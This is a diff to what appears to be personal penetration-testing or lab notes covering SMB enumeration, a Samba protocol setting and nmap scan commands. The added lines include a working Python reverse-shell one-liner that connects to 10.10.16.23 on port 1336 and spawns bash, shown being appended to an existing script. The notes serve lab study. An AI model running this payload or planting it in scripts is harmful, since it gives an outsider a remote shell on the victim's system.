@@ -50,6 +50,12 @@ Enumerating SMB: https://infinitelogins.com/2020/06/17/enumerating-smb-for-pente
 			- sudo nano /etc/samba/smb.conf
 			- Under Global: client min protocol = LANMAN1
 
+
+Adding code to an exisisting script/program on Linux: 
+
+	- python reverseshell example: echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.23",1336));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> tmp.py
+
+To clear contents of a file: cp /dev/null/ tmp.py
 nmap
   - Initial Scan: nmap -sC -sV -O -oA initial 10.10.10.13
   - Run the below as you enumerate your initial findings
